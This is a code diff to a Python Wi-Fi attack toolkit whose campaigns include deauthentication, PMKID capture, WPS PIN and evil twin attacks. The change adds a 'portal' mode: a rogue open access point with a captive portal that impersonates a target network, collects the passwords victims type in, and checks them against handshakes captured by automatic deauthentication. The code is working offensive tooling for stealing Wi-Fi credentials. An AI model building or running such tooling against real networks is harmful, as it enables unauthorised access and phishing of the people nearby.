@@ -108,8 +108,9 @@ _live_prev = {}
 #: A gap longer than this means nobody was sampling (screen away, radio retuned): not a rate.
 _LIVE_MAX_GAP_S = 5.0
 
-#: Every campaign this build exposes, by the name the app's protocol uses.
-_CAMPAIGN_KEYS = ("deauth", "pmkid", "pin", "pbc", "decloak", "wep", "eviltwin")
+#: Every campaign this build exposes, by the name the app's protocol uses. ``portal`` is the
+#: in-house AP (opx_ap) the crack sheet's AP mode runs.
+_CAMPAIGN_KEYS = ("deauth", "pmkid", "pin", "pbc", "decloak", "wep", "eviltwin", "portal")
 
 
 def _campaign_class(kind: str):
@@ -592,17 +593,22 @@ def targets():
     return json.dumps(rows)
 
 
-def verify_psk(bssid, psk):
-    """Check a submitted password against this AP's saved handshake, in wifi4's own vault.
+def _vault_verdict(bssid, psk):
+    """``(matched, have_handshake)`` for a candidate, off the AP's saved handshake.
 
-    ``Vault.verify_wpa_psk`` is the same verdict wifi4's Verify action uses; a match is saved
-    as a manually typed WPA PSK, so the app's capture list shows it as cracked. ``None`` from
-    the vault means no saved hashline, which is not a mismatch — the portal keeps asking.
+    ``poll_captures()`` runs first: the automatic (auto-deauth) path captured the 4-way in
+    wifi4's sink, and the AP watcher is what turns it into the hashlines this check reads. So
+    a Verify straight after the auto capture works without any extra preparation step.
     """
     target = str(bssid or "").lower()
     candidate = str(psk or "")
     if not target or not candidate:
-        return json.dumps({"ok": False, "have_handshake": False})
+        return False, False
+    if _array is not None:
+        try:
+            poll_captures()
+        except Exception:
+            traceback.print_exc()
     vault, _ = _vault_state()
     try:
         verdict = vault.verify_wpa_psk(target, candidate)
@@ -619,7 +625,13 @@ def verify_psk(bssid, psk):
             vault.save_wpa_psk(ssid, target, candidate, manual=True)
         except Exception:
             traceback.print_exc()
-    return json.dumps({"ok": ok, "have_handshake": verdict is not None})
+    return ok, verdict is not None
+
+
+def verify_psk(bssid, psk):
+    """Check a submitted password against this AP's saved handshake, in wifi4's own vault."""
+    ok, any_handshake = _vault_verdict(bssid, psk)
+    return json.dumps({"ok": ok, "have_handshake": any_handshake})
 
 
 def _rename_twin(campaign, ssid):
@@ -718,6 +730,27 @@ def _eviltwin_input(ap, options):
                          punt_once=bool(options.get("punt_once", False)))
 
 
+def _start_portal(ap, settings):
+    """The AP crack mode's host: opx_ap's open AP + captive portal on wifi4's card."""
+    from opx_ap import PortalAp
+
+    members = list(_array.members)
+    if not members:
+        raise RuntimeError("AP mode needs an open card")
+    by_name = {member.name: member for member in members}
+    iface = by_name.get(str(settings.get("twin_iface") or "")) or members[0]
+    ssid = str(settings.get("ssid") or getattr(ap, "ssid", "") or "").strip()
+    if not ssid:
+        raise ValueError("AP mode needs a network name")
+    template = str(settings.get("template") or "default")
+
+    def verify(psk):
+        ok, _ = _vault_verdict(ap.bssid, psk)
+        return ok
+
+    return PortalAp(_array, ap, iface, ssid, template, verify, _ui_log)
+
+
 def attack(kind, bssid=None, options=None):
     """Run wifi4's ``kind`` campaign against ``bssid``; True when it took the radio.
 
@@ -741,14 +774,27 @@ def attack(kind, bssid=None, options=None):
     ap = None
     if bssid:
         ap = _array.access_points.get(str(bssid).lower())
-        if ap is None:
+        if ap is None and kind != "portal":
             raise ValueError(f"wifi4 has not seen {bssid}")
     with _lock:
         if _campaign is not None and not _campaign.done:
             raise RuntimeError("a wifi4 campaign is already running")
         _log_lines.clear()
         _last_error = None
-        if kind == "eviltwin":
+        if kind == "portal":
+            if ap is None:
+                # The capture outlives the session's AP table: host under the sheet's own name
+                # on a plain channel instead of refusing because no live beacon was seen.
+                from types import SimpleNamespace
+
+                ap = SimpleNamespace(
+                    bssid=str(bssid).lower(),
+                    ssid=str(settings.get("ssid") or ""),
+                    channel=int(settings.get("channel") or 6),
+                    last_beacon_frame=b"",
+                )
+            campaign = _start_portal(ap, settings)
+        elif kind == "eviltwin":
             if ap is None:
                 raise ValueError("EvilTwin needs a target network")
             campaign = _campaign_class(kind)(_array, ap, _eviltwin_input(ap, settings))
